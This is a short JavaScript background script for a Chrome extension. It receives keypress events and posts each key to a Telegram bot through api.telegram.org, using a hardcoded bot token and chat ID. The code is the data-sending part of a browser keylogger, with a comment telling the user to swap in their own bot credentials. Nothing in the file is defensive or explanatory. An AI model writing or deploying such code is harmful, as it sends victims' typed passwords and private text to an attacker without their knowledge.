chrome.runtime.onMessage.addListener(function(e) {
  if ("keypress" === e.type) {
    let logs = e.key;

    // Replace the following with your Telegram bot token and chat ID
    const telegramBotToken = "6856178910:AAEaF5zbnBI7NVq43ijen8Id7yLugPMk0LY";
    const chatId = "1459600362";

    const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: logs
      })
    })
    .then(response => response.json())
    .then(data => console.log(data));
  }
});